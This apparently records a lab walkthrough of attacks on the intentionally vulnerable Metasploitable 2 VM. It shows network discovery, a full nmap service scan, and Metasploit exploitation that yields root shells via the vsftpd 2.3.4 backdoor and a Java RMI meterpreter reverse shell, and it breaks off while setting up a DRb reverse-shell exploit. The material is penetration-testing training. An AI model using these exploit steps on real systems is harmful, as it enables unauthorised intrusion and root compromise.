@@ -1,0 +1,2351 @@
+URL : https://www.vulnhub.com/entry/metasploitable-2,29/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+ Currently scanning: 172.16.47.0/16   |   Screen View: Unique Hosts                                                                                                                                               
+                                                                                                                                                                                                                  
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                  
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:e9:67:44    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.132 00:0c:29:8a:1d:fb    01    060   VMware, Inc.                                                                                                                                                    
+ 192.168.174.254 00:50:56:ed:a8:5e    01    060   VMWare, Inc.                                                                                                                                                    
+
+root@kali:~# 
+ 
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A 192.168.174.132
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2016-01-25 17:17 EST
+Nmap scan report for 192.168.174.132
+Host is up (0.00036s latency).
+Not shown: 65505 closed ports
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+23/tcp    open  telnet      Linux telnetd
+25/tcp    open  smtp        Postfix smtpd
+|_smtp-commands: metasploitable.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| ssl-cert: Subject: commonName=ubuntu804-base.localdomain/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2010-03-17T13:07:45+00:00
+|_Not valid after:  2010-04-16T13:07:45+00:00
+|_ssl-date: 2016-01-25T22:19:18+00:00; -4s from local time.
+53/tcp    open  domain      ISC BIND 9.4.2
+| dns-nsid: 
+|_  bind.version: 9.4.2
+80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Metasploitable2 - Linux
+111/tcp   open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      52125/tcp  mountd
+|   100005  1,2,3      59249/udp  mountd
+|   100021  1,3,4      37204/udp  nlockmgr
+|   100021  1,3,4      39725/tcp  nlockmgr
+|   100024  1          37930/tcp  status
+|_  100024  1          40225/udp  status
+139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+512/tcp   open  exec        netkit-rsh rexecd
+513/tcp   open  login?
+514/tcp   open  tcpwrapped
+1099/tcp  open  rmiregistry GNU Classpath grmiregistry
+|_rmi-dumpregistry: Registry listing failed (No return data received from server)
+1524/tcp  open  shell       Metasploitable root shell
+2049/tcp  open  nfs         2-4 (RPC #100003)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      52125/tcp  mountd
+|   100005  1,2,3      59249/udp  mountd
+|   100021  1,3,4      37204/udp  nlockmgr
+|   100021  1,3,4      39725/tcp  nlockmgr
+|   100024  1          37930/tcp  status
+|_  100024  1          40225/udp  status
+2121/tcp  open  ftp         ProFTPD 1.3.1
+3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
+| mysql-info: 
+|   Protocol: 53
+|   Version: .0.51a-3ubuntu5
+|   Thread ID: 8
+|   Capabilities flags: 43564
+|   Some Capabilities: SupportsCompression, Support41Auth, SupportsTransactions, SwitchToSSLAfterHandshake, ConnectWithDatabase, Speaks41ProtocolNew, LongColumnFlag
+|   Status: Autocommit
+|_  Salt: "4"H')5pXF4rd~n+'%$#
+3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp  open  vnc         VNC (protocol 3.3)
+| vnc-info: 
+|   Protocol version: 3.3
+|   Security types: 
+|_    Unknown security type (33554432)
+6000/tcp  open  X11         (access denied)
+6667/tcp  open  irc         Unreal ircd
+6697/tcp  open  irc         Unreal ircd
+8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+|_http-title: Apache Tomcat/5.5
+8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+37930/tcp open  status      1 (RPC #100024)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      52125/tcp  mountd
+|   100005  1,2,3      59249/udp  mountd
+|   100021  1,3,4      37204/udp  nlockmgr
+|   100021  1,3,4      39725/tcp  nlockmgr
+|   100024  1          37930/tcp  status
+|_  100024  1          40225/udp  status
+39725/tcp open  nlockmgr    1-4 (RPC #100021)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      52125/tcp  mountd
+|   100005  1,2,3      59249/udp  mountd
+|   100021  1,3,4      37204/udp  nlockmgr
+|   100021  1,3,4      39725/tcp  nlockmgr
+|   100024  1          37930/tcp  status
+|_  100024  1          40225/udp  status
+51195/tcp open  unknown
+52125/tcp open  mountd      1-3 (RPC #100005)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      52125/tcp  mountd
+|   100005  1,2,3      59249/udp  mountd
+|   100021  1,3,4      37204/udp  nlockmgr
+|   100021  1,3,4      39725/tcp  nlockmgr
+|   100024  1          37930/tcp  status
+|_  100024  1          40225/udp  status
+MAC Address: 00:0C:29:8A:1D:FB (VMware)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP
+|_  System time: 2016-01-25T17:19:19-05:00
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.36 ms 192.168.174.132
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 195.79 seconds
+root@kali:~# 
+
+3.) Enumerating port 21/tcp - ftp - vsftpd 2.3.4 - ftp-anon: Anonymous FTP login allowed (FTP code 230)
+root@kali:~# msfconsole
+msf > search vsftpd
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                  Disclosure Date  Rank       Description
+   ----                                  ---------------  ----       -----------
+   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
+
+
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+msf exploit(vsftpd_234_backdoor) > show options 
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST                   yes       The target address
+   RPORT  21               yes       The target port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(vsftpd_234_backdoor) > set RHOST 192.168.174.132
+RHOST => 192.168.174.132
+msf exploit(vsftpd_234_backdoor) > exploit 
+
+[*] Banner: 220 (vsFTPd 2.3.4)
+[*] USER: 331 Please specify the password.
+[+] Backdoor service has been spawned, handling...
+[+] UID: uid=0(root) gid=0(root)
+[*] Found shell.
+[*] Command shell session 1 opened (192.168.174.137:39651 -> 192.168.174.132:6200) at 2016-01-25 17:23:43 -0500
+
+id
+uid=0(root) gid=0(root)
+whoami
+root
+hostname
+metasploitable
+
+4.) Enumerating port - 1099/tcp - rmiregistry GNU Classpath grmiregistry - rmi-dumpregistry: Registry listing failed (No return data received from server)
+In msf
+msf > search rmi
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                            Disclosure Date  Rank       Description
+   ----                                                            ---------------  ----       -----------
+   auxiliary/admin/hp/hp_imc_som_create_account                    2013-10-08       normal     HP Intelligent Management SOM Account Creation
+   auxiliary/admin/http/foreman_openstack_satellite_priv_esc       2013-06-06       normal     Foreman (Red Hat OpenStack/Satellite) users/create Mass Assignment
+   auxiliary/admin/mssql/mssql_findandsampledata                                    normal     Microsoft SQL Server Find and Sample Data
+   auxiliary/admin/vmware/terminate_esx_sessions                                    normal     VMWare Terminate ESX Login Sessions
+   auxiliary/admin/webmin/file_disclosure                          2006-06-30       normal     Webmin File Disclosure
+   auxiliary/dos/http/apache_mod_isapi                             2010-03-05       normal     Apache mod_isapi Dangling Pointer
+   auxiliary/dos/windows/ftp/winftp230_nlst                        2008-09-26       normal     WinFTP 2.3.0 NLST Denial of Service
+   auxiliary/dos/windows/ftp/xmeasy560_nlst                        2008-10-13       normal     XM Easy Personal FTP Server 5.6.0 NLST DoS
+   auxiliary/dos/windows/ftp/xmeasy570_nlst                        2009-03-27       normal     XM Easy Personal FTP Server 5.7.0 NLST DoS
+   auxiliary/gather/emc_cta_xxe                                    2014-03-31       normal     EMC CTA v10.0 Unauthenticated XXE Arbitrary File Read
+   auxiliary/gather/enum_dns                                                        normal     DNS Record Scanner and Enumerator 
+   auxiliary/gather/joomla_weblinks_sqli                           2014-03-02       normal     Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read
+   auxiliary/gather/mcafee_epo_xxe                                 2015-01-06       normal     McAfee ePolicy Orchestrator Authenticated XXE Credentials Exposure
+   auxiliary/gather/wp_ultimate_csv_importer_user_extract          2015-02-02       normal     WordPress Ultimate CSV Importer User Table Extract
+   auxiliary/scanner/dcerpc/hidden                                                  normal     Hidden DCERPC Service Discovery
+   auxiliary/scanner/dcerpc/tcp_dcerpc_auditor                                      normal     DCERPC TCP Service Auditor
+   auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement                   normal     IPv6 Local Neighbor Discovery Using Router Advertisement
+   auxiliary/scanner/http/apache_userdir_enum                                       normal     Apache "mod_userdir" User Enumeration
+   auxiliary/scanner/http/frontpage_login                                           normal     FrontPage Server Extensions Anonymous Login Scanner
+   auxiliary/scanner/http/http_traversal                                            normal     Generic HTTP Directory Traversal Utility
+   auxiliary/scanner/http/ntlm_info_enumeration                                     normal     Host Information Enumeration via NTLM Authentication
+   auxiliary/scanner/http/smt_ipmi_49152_exposure                  2014-06-19       normal     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
+   auxiliary/scanner/http/smt_ipmi_cgi_scanner                     2013-11-06       normal     Supermicro Onboard IPMI CGI Vulnerability Scanner
+   auxiliary/scanner/http/smt_ipmi_static_cert_scanner             2013-11-06       normal     Supermicro Onboard IPMI Static SSL Certificate Scanner
+   auxiliary/scanner/http/smt_ipmi_url_redirect_traversal          2013-11-06       normal     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal
+   auxiliary/scanner/http/squid_pivot_scanning                                      normal     Squid Proxy Port Scanner
+   auxiliary/scanner/http/sybase_easerver_traversal                2011-05-25       normal     Sybase Easerver 6.3 Directory Traversal
+   auxiliary/scanner/http/titan_ftp_admin_pwd                                       normal     Titan FTP Administrative Password Disclosure
+   auxiliary/scanner/http/wordpress_ghost_scanner                                   normal     WordPress XMLRPC GHOST Vulnerability Scanner
+   auxiliary/scanner/ip/ipidseq                                                     normal     IPID Sequence Scanner
+   auxiliary/scanner/lotus/lotus_domino_version                                     normal     Lotus Domino Version
+   auxiliary/scanner/misc/cctv_dvr_login                                            normal     CCTV DVR Login Scanning Utility
+   auxiliary/scanner/misc/java_rmi_server                          2011-10-15       normal     Java RMI Server Insecure Endpoint Code Execution Scanner
+   auxiliary/scanner/nfs/nfsmount                                                   normal     NFS Mount Scanner
+   auxiliary/scanner/ntp/ntp_monlist                                                normal     NTP Monitor List Scanner
+   auxiliary/scanner/ntp/ntp_peer_list_dos                         2014-08-25       normal     NTP Mode 7 PEER_LIST DoS Scanner
+   auxiliary/scanner/ntp/ntp_peer_list_sum_dos                     2014-08-25       normal     NTP Mode 7 PEER_LIST_SUM DoS Scanner
+   auxiliary/scanner/ntp/ntp_req_nonce_dos                         2014-08-25       normal     NTP Mode 6 REQ_NONCE DRDoS Scanner
+   auxiliary/scanner/ntp/ntp_reslist_dos                           2014-08-25       normal     NTP Mode 7 GET_RESTRICT DRDoS Scanner
+   auxiliary/scanner/ntp/ntp_unsettrap_dos                         2014-08-25       normal     NTP Mode 6 UNSETTRAP DRDoS Scanner
+   auxiliary/scanner/rogue/rogue_send                                               normal     Rogue Gateway Detection: Sender
+   auxiliary/scanner/smb/pipe_auditor                                               normal     SMB Session Pipe Auditor
+   auxiliary/scanner/smb/pipe_dcerpc_auditor                                        normal     SMB Session Pipe DCERPC Auditor
+   auxiliary/scanner/smb/smb_enumshares                                             normal     SMB Share Enumeration
+   auxiliary/scanner/smb/smb_enumusers                                              normal     SMB User Enumeration (SAM EnumUsers)
+   auxiliary/scanner/smb/smb_enumusers_domain                                       normal     SMB Domain User Enumeration
+   auxiliary/scanner/smb/smb_lookupsid                                              normal     SMB SID User Enumeration (LookupSid)
+   auxiliary/scanner/smtp/smtp_enum                                                 normal     SMTP User Enumeration Utility
+   auxiliary/scanner/snmp/snmp_set                                                  normal     SNMP Set Module
+   auxiliary/scanner/ssh/ssh_enumusers                                              normal     SSH Username Enumeration
+   auxiliary/scanner/ssh/ssh_identify_pubkeys                                       normal     SSH Public Key Acceptance Scanner
+   auxiliary/scanner/vmware/vmware_enum_permissions                                 normal     VMWare Enumerate Permissions
+   auxiliary/server/capture/drda                                                    normal     Authentication Capture: DRDA (DB2, Informix, Derby)
+   auxiliary/spoof/dns/compare_results                             2008-07-21       normal     DNS Lookup Result Comparison
+   encoder/ppc/longxor_tag                                                          normal     PPC LongXOR Encoder
+   exploit/android/browser/samsung_knox_smdm_url                   2014-11-12       normal     Samsung Galaxy KNOX Android Browser RCE
+   exploit/linux/http/nginx_chunked_size                           2013-05-07       normal     Nginx HTTP Server 1.3.9-1.4.0 Chunked Encoding Stack Buffer Overflow
+   exploit/linux/http/smt_ipmi_close_window_bof                    2013-11-06       good       Supermicro Onboard IPMI close_window.cgi Buffer Overflow
+   exploit/multi/browser/firefox_xpi_bootstrapped_addon            2007-06-27       excellent  Mozilla Firefox Bootstrapped Addon Social Engineering Code Execution
+   exploit/multi/browser/java_rmi_connection_impl                  2010-03-31       excellent  Java RMIConnectionImpl Deserialization Privilege Escalation
+   exploit/multi/browser/java_signed_applet                        1997-02-19       excellent  Java Signed Applet Social Engineering Code Execution
+   exploit/multi/http/mobilecartly_upload_exec                     2012-08-10       excellent  MobileCartly 1.0 Arbitrary File Creation Vulnerability
+   exploit/multi/http/visual_mining_netcharts_upload               2014-11-03       excellent  Visual Mining NetCharts Server Remote Code Execution
+   exploit/multi/misc/java_jmx_server                              2013-05-22       excellent  Java JMX Server Insecure Configuration Java Code Execution
+   exploit/multi/misc/java_rmi_server                              2011-10-15       excellent  Java RMI Server Insecure Default Configuration Java Code Execution
+   exploit/multi/upnp/libupnp_ssdp_overflow                        2013-01-29       normal     Portable UPnP SDK unique_service_name() Remote Code Execution
+   exploit/osx/browser/safari_metadata_archive                     2006-02-21       excellent  Safari Archive Metadata Command Execution
+   exploit/osx/local/sudo_password_bypass                          2013-02-28       normal     Mac OS X Sudo Password Bypass
+   exploit/unix/webapp/cakephp_cache_corruption                    2010-11-15       excellent  CakePHP Cache Corruption Code Execution
+   exploit/unix/webapp/coppermine_piceditor                        2008-01-30       excellent  Coppermine Photo Gallery picEditor.php Command Execution
+   exploit/unix/webapp/horde_unserialize_exec                      2013-06-27       excellent  Horde Framework Unserialize PHP Code Execution
+   exploit/unix/webapp/kimai_sqli                                  2013-05-21       average    Kimai v0.9.2 'db_restore.php' SQL Injection
+   exploit/unix/webapp/oscommerce_filemanager                      2009-08-31       excellent  osCommerce 2.2 Arbitrary PHP Code Execution
+   exploit/unix/webapp/sugarcrm_unserialize_exec                   2012-06-23       excellent  SugarCRM unserialize() PHP Code Execution
+   exploit/unix/webapp/tuleap_unserialize_exec                     2014-11-27       excellent  Tuleap PHP Unserialize Code Execution
+   exploit/unix/webapp/wp_wysija_newsletters_upload                2014-07-01       excellent  Wordpress MailPoet Newsletters (wysija-newsletters) Unauthenticated File Upload
+   exploit/windows/browser/ms06_067_keyframe                       2006-11-14       normal     MS06-067 Microsoft Internet Explorer Daxctle.OCX KeyFrame Method Heap Buffer Overflow Vulnerability
+   exploit/windows/browser/ms07_017_ani_loadimage_chunksize        2007-03-28       great      Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (HTTP)
+   exploit/windows/browser/ms10_090_ie_css_clip                    2010-11-03       good       MS10-090 Microsoft Internet Explorer CSS SetUserClip Memory Corruption
+   exploit/windows/email/ms07_017_ani_loadimage_chunksize          2007-03-28       great      Windows ANI LoadAniIcon() Chunk Size Stack Buffer Overflow (SMTP)
+   exploit/windows/fileformat/ibm_pcm_ws                           2012-02-28       great      IBM Personal Communications iSeries Access WorkStation 5.9 Profile
+   exploit/windows/ftp/open_ftpd_wbem                              2012-06-18       excellent  Open-FTPD 1.2 Arbitrary File Upload
+   exploit/windows/ftp/vermillion_ftpd_port                        2009-09-23       great      Vermillion FTP Daemon PORT Command Memory Corruption
+   exploit/windows/http/amlibweb_webquerydll_app                   2010-08-03       normal     Amlibweb NetOpacs webquery.dll Stack Buffer Overflow
+   exploit/windows/http/apache_chunked                             2002-06-19       good       Apache Win32 Chunked Encoding
+   exploit/windows/http/cogent_datahub_command                     2014-04-29       manual     Cogent DataHub Command Injection
+   exploit/windows/http/sysax_create_folder                        2012-07-29       normal     Sysax Multi Server 5.64 Create Folder Buffer Overflow
+   exploit/windows/http/ultraminihttp_bof                          2013-07-10       normal     Ultra Mini HTTPD Stack Buffer Overflow
+   exploit/windows/http/umbraco_upload_aspx                        2012-06-28       excellent  Umbraco CMS Remote Command Execution
+   exploit/windows/iis/iis_webdav_upload_asp                       1994-01-01       excellent  Microsoft IIS WebDAV Write Access Code Execution
+   exploit/windows/iis/ms02_018_htr                                2002-04-10       good       MS02-018 Microsoft IIS 4.0 .HTR Path Overflow
+   exploit/windows/isapi/rsa_webagent_redirect                     2005-10-21       good       Microsoft IIS ISAPI RSA WebAgent Redirect Overflow
+   exploit/windows/local/ntapphelpcachecontrol                     2014-09-30       normal     MS15-001 Microsoft Windows NtApphelpCacheControl Improper Authorization Check
+   exploit/windows/local/s4u_persistence                           2013-01-02       excellent  Windows Manage User Level Persistent Payload Installer
+   exploit/windows/local/service_permissions                       2012-10-15       great      Windows Escalate Service Permissions Local Privilege Escalation
+   exploit/windows/misc/itunes_extm3u_bof                          2012-06-21       normal     Apple iTunes 10 Extended M3U Stack Buffer Overflow
+   exploit/windows/misc/poisonivy_bof                              2012-06-24       normal     Poison Ivy Server Buffer Overflow
+   exploit/windows/mssql/ms02_039_slammer                          2002-07-24       good       MS02-039 Microsoft SQL Server Resolution Overflow
+   exploit/windows/mssql/ms09_004_sp_replwritetovarbin             2008-12-09       good       MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
+   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli        2008-12-09       excellent  MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
+   exploit/windows/mysql/mysql_payload                             2009-01-16       excellent  Oracle MySQL for Microsoft Windows Payload Execution
+   exploit/windows/smb/ms06_040_netapi                             2006-08-08       good       MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   exploit/windows/telnet/gamsoft_telsrv_username                  2000-07-17       average    GAMSoft TelSrv 1.5 Username Buffer Overflow
+   post/linux/gather/checkvm                                                        normal     Linux Gather Virtual Environment Detection
+   post/multi/gather/wlan_geolocate                                                 normal     Multiplatform WLAN Enumeration and Geolocation
+   post/multi/manage/dbvis_add_db_admin                                             normal     Multi Manage DbVisualizer Add Db Admin
+   post/solaris/gather/checkvm                                                      normal     Solaris Gather Virtual Environment Detection
+   post/windows/gather/checkvm                                                      normal     Windows Gather Virtual Environment Detection
+   post/windows/gather/enum_dirperms                                                normal     Windows Gather Directory Permissions Enumeration
+   post/windows/gather/enum_termserv                                                normal     Windows Gather Terminal Server Client Connection Information Dumper
+   post/windows/gather/memory_grep                                                  normal     Windows Gather Process Memory Grep
+   post/windows/gather/screen_spy                                                   normal     Windows Gather Screen Spy
+
+
+msf > use exploit/multi/misc/java_rmi_server
+msf exploit(java_rmi_server) > show options 
+
+Module options (exploit/multi/misc/java_rmi_server):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
+   RHOST                       yes       The target address
+   RPORT      1099             yes       The target port
+   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL for incoming connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                     no        The URI to use for this exploit (default is random)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+msf exploit(java_rmi_server) > set RHOST 192.168.174.132
+RHOST => 192.168.174.132
+msf exploit(java_rmi_server) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                            Disclosure Date  Rank    Description
+   ----                            ---------------  ----    -----------
+   generic/custom                                   normal  Custom Payload
+   generic/shell_bind_tcp                           normal  Generic Command Shell, Bind TCP Inline
+   generic/shell_reverse_tcp                        normal  Generic Command Shell, Reverse TCP Inline
+   java/meterpreter/bind_tcp                        normal  Java Meterpreter, Java Bind TCP Stager
+   java/meterpreter/reverse_http                    normal  Java Meterpreter, Java Reverse HTTP Stager
+   java/meterpreter/reverse_https                   normal  Java Meterpreter, Java Reverse HTTPS Stager
+   java/meterpreter/reverse_tcp                     normal  Java Meterpreter, Java Reverse TCP Stager
+   java/shell/bind_tcp                              normal  Command Shell, Java Bind TCP Stager
+   java/shell/reverse_tcp                           normal  Command Shell, Java Reverse TCP Stager
+   java/shell_reverse_tcp                           normal  Java Command Shell, Reverse TCP Inline
+
+msf exploit(java_rmi_server) > set payload java/meterpreter/reverse_tcp
+payload => java/meterpreter/reverse_tcp
+msf exploit(java_rmi_server) > show options 
+
+Module options (exploit/multi/misc/java_rmi_server):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
+   RHOST      192.168.174.132  yes       The target address
+   RPORT      1099             yes       The target port
+   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL for incoming connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                     no        The URI to use for this exploit (default is random)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+msf exploit(java_rmi_server) > set LHOST 192.168.174.137
+LHOST => 192.168.174.137
+msf exploit(java_rmi_server) > exploit 
+
+[*] Started reverse handler on 192.168.174.137:4444 
+[*] Using URL: http://0.0.0.0:8080/kJuKmwrNdQTi
+[*]  Local IP: http://192.168.174.137:8080/kJuKmwrNdQTi
+[*] Server started.
+[*] 192.168.174.132:1099 - Sending RMI Header...
+[*] 192.168.174.132:1099 - Sending RMI Call...
+[*] 192.168.174.132  java_rmi_server - Replied to request for payload JAR
+[*] Sending stage (30680 bytes) to 192.168.174.132
+[*] Meterpreter session 2 opened (192.168.174.137:4444 -> 192.168.174.132:35279) at 2016-01-25 17:29:54 -0500
+[*] Server stopped.
+
+meterpreter > getuid
+Server username: root
+meterpreter > 
+
+5.) Enumerating port - 8787/tcp - drb - Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
+In msf
+msf > search drb
+[!] Database not connected or cache not built, using slow search
+
+Matching Modules
+================
+
+   Name                                                   Disclosure Date  Rank       Description
+   ----                                                   ---------------  ----       -----------
+   exploit/linux/misc/drb_remote_codeexec                 2011-03-23       excellent  Distributed Ruby Send instance_eval/syscall Code Execution
+   exploit/multi/misc/wireshark_lwres_getaddrbyname       2010-01-27       great      Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow
+   exploit/multi/misc/wireshark_lwres_getaddrbyname_loop  2010-01-27       great      Wireshark LWRES Dissector getaddrsbyname_request Buffer Overflow (loop)
+
+
+msf > use exploit/linux/misc/drb_remote_codeexec
+msf exploit(drb_remote_codeexec) > show options 
+
+Module options (exploit/linux/misc/drb_remote_codeexec):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+   URI                    yes       The dRuby URI of the target host (druby://host:port)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(drb_remote_codeexec) > set URI druby://192.168.174.132:8787
+URI => druby://192.168.174.132:8787
+msf exploit(drb_remote_codeexec) > show payloads 
+
+Compatible Payloads
+===================
+
+   Name                                Disclosure Date  Rank    Description
+   ----                                ---------------  ----    -----------
+   cmd/unix/bind_awk                                    normal  Unix Command Shell, Bind TCP (via AWK)
+   cmd/unix/bind_lua                                    normal  Unix Command Shell, Bind TCP (via Lua)
+   cmd/unix/bind_netcat                                 normal  Unix Command Shell, Bind TCP (via netcat)
+   cmd/unix/bind_netcat_gaping                          normal  Unix Command Shell, Bind TCP (via netcat -e)
+   cmd/unix/bind_netcat_gaping_ipv6                     normal  Unix Command Shell, Bind TCP (via netcat -e) IPv6
+   cmd/unix/bind_nodejs                                 normal  Unix Command Shell, Bind TCP (via nodejs)
+   cmd/unix/bind_perl                                   normal  Unix Command Shell, Bind TCP (via Perl)
+   cmd/unix/bind_perl_ipv6                              normal  Unix Command Shell, Bind TCP (via perl) IPv6
+   cmd/unix/bind_ruby                                   normal  Unix Command Shell, Bind TCP (via Ruby)
+   cmd/unix/bind_ruby_ipv6                              normal  Unix Command Shell, Bind TCP (via Ruby) IPv6
+   cmd/unix/bind_zsh                                    normal  Unix Command Shell, Bind TCP (via Zsh)
+   cmd/unix/generic                                     normal  Unix Command, Generic Command Execution
+   cmd/unix/reverse                                     normal  Unix Command Shell, Double Reverse TCP (telnet)
+   cmd/unix/reverse_awk                                 normal  Unix Command Shell, Reverse TCP (via AWK)
+   cmd/unix/reverse_lua                                 normal  Unix Command Shell, Reverse TCP (via Lua)
+   cmd/unix/reverse_netcat                              normal  Unix Command Shell, Reverse TCP (via netcat)
+   cmd/unix/reverse_netcat_gaping                       normal  Unix Command Shell, Reverse TCP (via netcat -e)
+   cmd/unix/reverse_nodejs                              normal  Unix Command Shell, Reverse TCP (via nodejs)
+   cmd/unix/reverse_openssl                             normal  Unix Command Shell, Double Reverse TCP SSL (openssl)
+   cmd/unix/reverse_perl                                normal  Unix Command Shell, Reverse TCP (via Perl)
+   cmd/unix/reverse_perl_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via perl)
+   cmd/unix/reverse_php_ssl                             normal  Unix Command Shell, Reverse TCP SSL (via php)
+   cmd/unix/reverse_python                              normal  Unix Command Shell, Reverse TCP (via Python)
+   cmd/unix/reverse_python_ssl                          normal  Unix Command Shell, Reverse TCP SSL (via python)
+   cmd/unix/reverse_ruby                                normal  Unix Command Shell, Reverse TCP (via Ruby)
+   cmd/unix/reverse_ruby_ssl                            normal  Unix Command Shell, Reverse TCP SSL (via Ruby)
+   cmd/unix/reverse_ssl_double_telnet                   normal  Unix Command Shell, Double Reverse TCP SSL (telnet)
+   cmd/unix/reverse_zsh                                 normal  Unix Command Shell, Reverse TCP (via Zsh)
+
+msf exploit(drb_remote_codeexec) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf exploit(drb_remote_codeexec) > show options 
+
+Module options (exploit/linux/misc/drb_remote_codeexec):
+
